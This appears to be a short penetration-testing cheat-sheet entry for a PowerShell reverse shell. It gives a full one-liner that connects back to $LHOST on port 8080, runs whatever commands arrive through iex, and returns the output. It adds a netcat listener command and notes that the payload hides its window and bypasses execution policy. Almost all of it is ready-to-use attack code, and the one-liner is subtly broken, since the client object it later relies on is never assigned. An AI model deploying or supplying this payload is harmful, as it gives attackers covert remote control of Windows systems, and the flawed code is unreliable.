# PowerShell Reverse Shell

A standard reverse shell payload using PowerShell. Useful on Windows targets.

Used on: **<Machine>**

## One-liner

<!-- cmd: windows -->
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$LHOST",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- This is a very common PowerShell reverse shell that doesn't rely on downloading external scripts.
- It bypasses execution policy and hides the window.
- Make sure to properly escape quotes if executing this from a command prompt (`cmd.exe`).
